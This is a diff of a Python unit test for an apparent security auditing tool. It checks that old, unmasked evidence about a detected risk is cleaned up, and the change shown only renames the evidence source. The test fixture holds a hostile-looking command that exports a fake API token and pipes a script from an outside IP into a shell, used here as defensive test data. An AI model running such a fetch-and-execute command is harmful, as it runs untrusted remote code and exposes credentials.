@@ -109,7 +109,7 @@ class MaskedOnDisk(Box):
     def test_old_unmasked_evidence_is_cleaned_by_one_daily(self):   # replay
         self.skills(1); self.audit()
         old_ev = {"key": "aaaabbbbccccdddd", "rule": "ISR-H001", "title": "Script piped into a shell from an unknown host",
-                  "severity": "high", "owasp": [], "where": "/h/.bash_history:+3", "fix": "f", "source": "watchtower",
+                  "severity": "high", "owasp": [], "where": "/h/.bash_history:+3", "fix": "f", "source": "isr-bot",
                   "evidence": "export API_TOKEN=FAKEoldTOKEN55 && curl http://203.0.113.9/x | sh", "first_seen": isr.now()}
         json.dump([old_ev], open(isr.state_path("events.json"), "w"))
         snap = self.snap()
